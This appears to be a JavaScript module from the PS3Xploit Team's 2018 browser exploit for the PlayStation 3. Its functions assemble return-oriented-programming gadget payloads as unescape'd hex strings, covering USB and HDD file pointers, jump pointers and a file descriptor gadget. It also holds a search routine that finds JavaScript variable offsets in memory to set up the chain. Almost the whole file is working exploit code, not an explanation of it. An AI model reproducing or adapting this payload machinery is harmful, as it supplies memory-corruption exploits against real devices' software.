// PS3 Default Search Pointers Gadget Hex
// PS3Xploit Team 2018 / ps3xploit.com


// REQUIRED

// Default USB File Pointer 1 / Gadget #1 + TOC Gadget Hex
function reload_usb_fp(state)
{
	if(state){
		//return unescape("\u4141")+str2u(path_usb_flash_hex)+unescape("\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u0000\uFFFF\uFFFF\u4141\uFD7E");// 56 bytes
		return unescape("\u4141\u2F64\u6576\u5F75\u7362\u3030\u302F\u6964\u7073\u2E68\u6578\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u0000\uFFFF\uFFFF\u4141\uFD7E");// 56 bytes
	}
	else{
		return;
	}
}

// Gadget Stackframe Setup
// moved to stack.js to keep them all together

// Default Jump 1 Pointer
function reload_jump1(state)
{
	if(state){
		return unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
	}
	else{
		return;
	}
}

// Default Jump 2 Pointer
/*
function reload_jump2(state)
{
	if(state){
		return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
		jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
	}
	else{
		return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
		jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
	}
}
*/

// Default Jump 2 Pointer
function reload_jump2(state, stage)
{
	if(state){
		switch (stage) {
		case "1":
			return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950");// 50 bytes
			break;
		case "2":
			return unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");// 18 bytes
			break;
		default:
			break;
		}
	}
	else{
		return;
	}
}


// OPTIONAL

// Default Generic File Descriptor Gadget Hex
function reload_fd(state)
{
	if(state){
		return unescape("\u4242\u4141\u4141\uFD8C");// 8 bytes
	}
	else{
		return;
	}
}

// Default HDD File Pointer 1 Gadget Hex
function reload_hdd_fp(state)
{
	if(state){
		return unescape("\u4141")+str2u(path_name_src)+unescape("\u0000\u0000\u4141\u4141\uFD7C");// path+12 bytes
	}
	else{
		return;
	}
}

// Default HDD File Pointer 2 Gadget Hex
function reload_hdd_fp2(state)
{
	if(state){
		return unescape("\u4141")+str2u(path_name_dest)+unescape("\u0000\u0000\u4141\u4141\uFD6C");// path+12 bytes
	}
	else{
		return;
	}
}

// Default USB File Pointer 2 Gadget Hex
function reload_usb_fp2(state)
{
	if(state){
		return unescape("\u4141")+str2u(path_usb_default)+unescape("\u0000\u0000\u4141\u4141\uFD6B");// path+12 bytes
	}
	else{
		return;
	}
}


// Main Search Function
function find_dynamic_offset(placeholder, name, hex)
{
	_addr=0;
	do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();searchResetTimeout();}
			return;}
			hex=hex.replaceAt(0x000/2,hexh2bin(placeholder));
			if(debug_mode){_addr=findJsVariableOffsetDebug(name,hex,search_base_offset,search_range_size,placeholder,hex.length, log_div);}
			else{_addr=findJsVariableOffset(name,hex,search_base_offset,search_range_size,placeholder,hex.length);}
			search_max_threshold-=search_range_size;
		}while(_addr==0);
	return _addr;
}
